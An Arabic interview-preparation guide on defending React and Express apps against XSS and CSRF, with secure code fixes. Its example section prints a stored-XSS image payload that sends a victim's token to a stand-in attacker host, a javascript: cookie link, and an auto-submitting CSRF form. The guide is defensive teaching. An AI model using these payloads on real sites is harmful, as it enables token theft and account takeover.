# كيف تحمي تطبيقاتك من هجمات XSS و CSRF؟

**Level:** Mid
**Merged from (original phrasings):**
- كيف تحمي التطبيقات من هجمات XSS و CSRF؟

## The concept
- **هجوم XSS (Cross-Site Scripting)**: ينجح المهاجم في **تشغيل كود JavaScript خبيث تابع له داخل نطاق موقعك (Origin)**، مثلاً عبر محتوى يدخله المستخدم يُعرض كـ HTML، أو روابط `javascript:`، أو سكربت خارجي مخترق. يستطيع ذلك السكربت فعل كل ما يفعله المستخدم: قراءة الـ DOM، وسرقة الرموز غير المحمية بـ httpOnly، واستدعاء واجهاتك البرمجية، وسرقة مدخلات النماذج الحساسة.
  - يقوم React بترميز النصوص تلقائياً داخل الأقواس `{}`. وتكمن الثغرات في منافذ الهروب: مثل `dangerouslySetInnerHTML`، وروابط `href={userUrl}` التي تبدأ بـ `javascript:`، وتعديلات الـ DOM المباشرة (`innerHTML`)، ودوال `eval`، وحقن JSON غير معقم داخل وسوم `<script>` في الـ SSR.
  - الدفاعات: تجنب تصيير HTML خام. وإن كان لابد فعقمه بمكتبة **DOMPurify**. وتحقق من صحة بروتوكول الروابط (`https:` فقط). وفرض سياسة أمان محتوى صارمة **Content Security Policy (CSP)** كطبقة دفاع ثانية. واستخدم **Subresource Integrity (SRI)** للسكربتات الخارجية، واجعل كوكيز الجلسة **httpOnly**.
- **هجوم CSRF (Cross-Site Request Forgery)**: يقوم موقع خبيث بجعل **متصفح** المستخدم يرسل طلباً لموقعك دون علمه، ويقوم المتصفح **بإرفاق كوكيز الجلسة تلقائياً**، فيعامل الخادم الطلب كطلب مصرح به. لا يستطيع المهاجم قراءة الرد، لكنه يستطيع تغيير الحالة (تحويل أموال، أو تغيير البريد الإلكتروني وكلمة المرور).
  - الدفاعات: كوكيز **SameSite=Lax/Strict** (تمنع إرسال الكوكيز مع طلبات الـ POST القادمة من مواقع أخرى)، ورموز **CSRF Tokens** للعمليات التعديلية، وفحص هيدرز `Origin` و `Sec-Fetch-Site`، وعدم تعديل أي حالة عبر طلبات GET، وضبط سياسات CORS بدقة.
- قاعدة جوهرية: **ثغرة الـ XSS تكسر حماية الـ CSRF بالكامل** (لأن السكربت الذي يعمل داخل نطاقك يستطيع قراءة رمز الـ CSRF Token)، لذا فإن سد ثغرات XSS يأتي في المقام الأول دائماً.

## Real-life example
في تطبيق مجتمعي لمشاركة وصفات الطهي، يكتب المستخدمون الوصف باستخدام محرر نصوص غني، ويُحفظ كود الـ HTML في قاعدة البيانات كما هو. نشر أحد المستخدمين وصفة تحتوي في وصفها على: `<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.token)">`. بمجرد فتح أي زائر لصفحة تلك الوصفة، يُرسل رمز الدخول الخاص به سراً لخادم المهاجم! وفي نفس التطبيق، كانت نقطة نهاية "تغيير البريد الإلكتروني" تقبل طلبات POST تعتمد على الكوكيز دون التحقق من رمز CSRF، مما سمح للمهاجم بوضع نموذج خفي في موقعه يُرسل تلقائياً ويغير بريد الضحية بمجرد زيارته.

```jsx
// ثغرة Stored XSS: تصيير HTML خام للمستخدم دون تعقيم
function RecipeDescription({ recipe }) {
  return <div dangerouslySetInnerHTML={{ __html: recipe.descriptionHtml }} />;
}

// رابط غير مفحوص: <a href="javascript:alert(document.cookie)">
function AuthorLink({ author }) {
  return <a href={author.website}>{author.name}'s website</a>;
}
```

```html
<!-- في موقع المهاجم evil.example: هجوم CSRF عبر نموذج يُرسل تلقائياً -->
<form action="https://recipes.example.com/api/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example" />
</form>
<script>document.forms[0].submit()</script>
```

## How to fix it
**حماية XSS: التعقيم، وفحص الروابط، وفرض سياسة CSP:**
```jsx
import DOMPurify from 'dompurify';

const ALLOWED = { ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'a', 'h3'],
                  ALLOWED_ATTR: ['href'] };

function RecipeDescription({ recipe }) {
  const clean = useMemo(() => DOMPurify.sanitize(recipe.descriptionHtml, ALLOWED), [recipe.descriptionHtml]);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

function safeUrl(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:' ? u.href : undefined;
  } catch { return undefined; }
}

function AuthorLink({ author }) {
  const href = safeUrl(author.website);
  return href ? <a href={href} rel="noopener noreferrer nofollow" target="_blank">{author.name}'s website</a> : null;
}
```

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random-per-request}' 'strict-dynamic';
  connect-src 'self' https://api.recipes.example.com;
  img-src 'self' https://cdn.recipes.example.com data:;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

**حماية CSRF: سمة SameSite + فحص الـ Token و الـ Origin:**
```js
res.cookie('sid', sessionId, { httpOnly: true, secure: true, sameSite: 'lax' });

app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.get('Origin');
  if (origin && origin !== 'https://recipes.example.com') return res.sendStatus(403);
  if (req.get('X-CSRF-Token') !== req.session.csrfToken) return res.sendStatus(403);
  next();
});
```

```js
// جانب العميل: إرفاق الرمز المميز مع كل طلب تعديلي
fetch('/api/account/email', {
  method: 'POST', credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ email }),
});
```
سبب نجاح الحل: تحذف مكتبة DOMPurify كافة معالجات الأحداث والوسوم الخطيرة وتبقي التنسيق الآمن فقط. وتعمل سياسة CSP كخط دفاع إضافي يحظر إرسال أي بيانات لنطاقات غريبة (`connect-src`). ولحماية الـ CSRF يرفض المتصفح إرفاق كوكيز `SameSite=Lax` مع طلبات الـ POST الخارجية، ويتحقق الخادم من تطابق الـ Origin ورمز الـ CSRF Token.

## How to say it in the interview
- "هجوم XSS يعني تشغيل كود المهاجم داخل نطاق موقعي، بينما CSRF يعني استغلال كوكيز موقعي من موقع المهاجم. هجومان مختلفان كلياً ويتطلبان دفاعات مختلفة."
- "يقوم React بترميز النصوص تلقائياً، لذا أركز على منافذ الاستثناء: `dangerouslySetInnerHTML`، وروابط `href` القادمة من المستخدمين، والسكربتات الخارجية. وأعقم باستخدام DOMPurify مع تطبيق سياسة CSP قوية ورموز SRI."
- فخ شائع: القول بأننا "نخزن JWT في localStorage لذلك نحن محصنون ضد CSRF". نعم، ولكنك فتحت الباب لسرقة الرمز بالكامل عبر أي ثغرة XSS! والحل الأفضل هو كوكيز httpOnly المحمية بـ SameSite ورموز CSRF.
- الموازنة (Trade-off): تطبيق سياسة CSP صارمة قد يعطل بعض السكربتات القديمة، لذا ابدأ بنشرها تجريبياً عبر هيدر `Content-Security-Policy-Report-Only` أولاً لمراقبة التقارير قبل تفعيل الحظر الكامل.
